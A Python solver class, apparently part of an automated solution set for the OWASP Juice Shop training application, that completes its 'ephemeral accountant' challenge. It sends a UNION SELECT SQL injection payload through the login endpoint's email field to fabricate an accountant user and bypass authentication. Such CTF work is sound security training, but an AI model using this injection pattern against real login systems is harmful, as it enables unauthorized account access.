from core.base_solver import BaseSolver
from loguru import logger

class EphemeralAccountantSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "ephemeralAccountantChallenge"

    def solve(self) -> bool:
        # Tutorial: Use UNION SELECT to create ephemeral user
        # Payload creates a fake accountant user in the query result
        email_payload = "acc0' UNION SELECT 1, 'accountant', 'acc0unt4nt@juice-sh.op', 'password', 'accounting', '', '', '', '', 1, '2023-01-01', '2023-01-01', null --"
        
        res = self.client.post("/rest/user/login", json={
            "email": email_payload, 
            "password": "anything"
        })
        
        if res.status_code == 200 and "authentication" in res.json():
            return True
        return False
